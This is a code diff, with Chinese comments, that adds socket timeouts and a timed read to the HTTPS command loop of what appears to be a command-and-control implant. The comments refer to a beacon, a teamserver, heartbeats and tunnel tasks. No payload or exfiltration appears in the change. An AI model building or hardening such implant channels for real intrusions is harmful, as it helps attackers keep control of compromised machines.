@@ -14,6 +14,12 @@
 #include "dns.h"
 
 #ifdef ARCH_X86_64
+/* HTTP/TLS 连接的单次收发超时（秒）。见 https_connect 里的详细说明：
+ * 不设超时会让阻塞读永久挂住整个命令循环。 */
+#ifndef AX_HTTP_IO_TIMEOUT_SEC
+#define AX_HTTP_IO_TIMEOUT_SEC 20
+#endif
+
 #include "syscalls_x64.h"
 #endif
 #ifdef ARCH_AARCH64
@@ -76,6 +82,30 @@ int https_connect(ws_connector_t* ws, const char* host, uint16_t port, int use_s
     if (sys_connect(fd, (const void*)&addr, sizeof(addr)) != 0) {
         sys_close(fd);
         return -1;
+    }
+
+    /* ★ 必须给 socket 设收发超时。
+     *
+     *   为什么：https_command_loop 是「POST → https_recv 读响应」的同步循环，
+     *   而 ws_sock_read 走的是**阻塞** sys_read/mbedtls_ssl_read，此前对端
+     *   （teamserver/listener）迟迟不返回响应体时会**永久阻塞**在这一读上。
+     *   实测后果非常隐蔽：打点文件 5 秒零增长（循环根本没前进）、心跳停了
+     *   （服务端 tickAge 一路涨到几百秒）、而单线程进程的 utime 却持续增长
+     *   （阻塞在 sys_read 里被算成 running）—— 看起来像「100% CPU 空转」，
+     *   实际是**卡死在读**。一旦卡住，后续所有隧道任务都不再被轮询，
+     *   现象就是「建了代理，第一次能连、之后全部超时」。
+     *
+     *   20s 的取值：够覆盖 beacon sleep（生成页可配到 30s 以上时由上层
+     *   rotate 兜底），又能在对端真的不回话时及时返回 -1、让循环重新建连。
+     */
+    {
+        struct hs_timeval { long tv_sec; long tv_usec; } io_to;
+        io_to.tv_sec  = AX_HTTP_IO_TIMEOUT_SEC;
+        io_to.tv_usec = 0;
+        sys_setsockopt(fd, 1 /*SOL_SOCKET*/, 20 /*SO_RCVTIMEO*/,
+                       (const void *)&io_to, (unsigned int)sizeof(io_to));
+        sys_setsockopt(fd, 1, 21 /*SO_SNDTIMEO*/,
+                       (const void *)&io_to, (unsigned int)sizeof(io_to));
     }
 
     ws->fd = fd;
@@ -216,6 +246,42 @@ int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
 
 // Read the HTTP response: headers until \r\n\r\n, then the Content-Length
 // body. Allocates *out_data/*out_len (caller frees).
+/* 带超时的单次读。为什么不能裸用 ws_tls_recv：
+ *
+ *   ws_sock_read 内部是**阻塞** sys_read / mbedtls_ssl_read，而 https_recv
+ *   是「逐字节读 header」的循环。对端不返回响应体时它会**永久挂住整个
+ *   命令循环** —— 实测症状：打点文件 5 秒零增长（循环根本没前进）、
+ *   心跳停了（服务端 tickAge 涨到几百秒）、单线程进程 utime 却持续增长
+ *   （阻塞在 sys_read 里被内核算成 running），看起来像「100% CPU 空转」，
+ *   实际是卡死在读。一卡住，后续所有隧道任务都不再被轮询 ⇒
+ *   「第一次能连、之后全部超时」。
+ *
+ *   做法与 connector.c 的 conn_poll_read 一致：先用 pselect6 带超时等可读，
+ *   就绪了才做真正的 read。这样对端不回话时能及时返回 -1，
+ *   上层 https_command_loop 会重连并把 connect 状态复位。
+ */
+static int https_read_timeout(ws_connector_t* ws, uint8_t* buf, size_t len, int timeout_ms)
+{
+    if (!ws || ws->fd < 0) return -1;
+
+    // fd_set 用与 connector.c 相同的布局（1024 bit）
+    typedef struct { unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))]; } hs_fdset_t;
+    hs_fdset_t rfds;
+    ax_memset(&rfds, 0, sizeof(rfds));
+    int fd = ws->fd;
+    if (fd < 0 || fd >= 1024) return -1;
+    rfds.fds_bits[fd / (8 * sizeof(unsigned long))] |= (1UL << (fd % (8 * sizeof(unsigned long))));
+
+    struct linux_timespec ts;
+    ts.tv_sec  = timeout_ms / 1000;
+    ts.tv_nsec = (long)(timeout_ms % 1000) * 1000000L;
+
+    int pr = sys_pselect6(fd + 1, (void*)&rfds, (void*)0, (void*)0, &ts, (void*)0);
+    if (pr <= 0) return -1;   // 0 = 超时, <0 = 出错 —— 都按失败处理
+
+    return ws_tls_recv(ws, buf, len);
+}
+
 int https_recv(ws_connector_t* ws, uint8_t** out_data, size_t* out_len) {
     *out_data = (uint8_t*)0;
     *out_len = 0;
@@ -234,7 +300,7 @@ int https_recv(ws_connector_t* ws, uint8_t** out_data, size_t* out_len) {
             if (!nh) { ax_free(hdr); return -1; }
             hdr = nh;
         }
-        int n = ws_tls_recv(ws, hdr + hlen, 1);
+        int n = https_read_timeout(ws, hdr + hlen, 1, AX_HTTP_IO_TIMEOUT_SEC * 1000);
         if (n <= 0) { ax_free(hdr); return -1; }
         hlen++;
         if (hlen >= 4 &&
@@ -281,9 +347,14 @@ int https_recv(ws_connector_t* ws, uint8_t** out_data, size_t* out_len) {
     uint8_t* body = (uint8_t*)ax_malloc(content_len > 0 ? content_len : 1);
     if (!body) return -1;
     if (content_len > 0) {
-        if (ws_tls_recv_exact(ws, body, content_len) != 0) {
-            ax_free(body);
-            return -1;
+        // 分块读 + 每块带超时：一次 ws_tls_recv_exact 吃满 content_len 时，
+        // 若对端中途停发就会永久阻塞（它内部循环调 ws_sock_read）。
+        size_t got = 0;
+        while (got < content_len) {
+            int n = https_read_timeout(ws, body + got, content_len - got,
+                                        AX_HTTP_IO_TIMEOUT_SEC * 1000);
+            if (n <= 0) { ax_free(body); return -1; }
+            got += (size_t)n;
         }
     }
     *out_data = body;
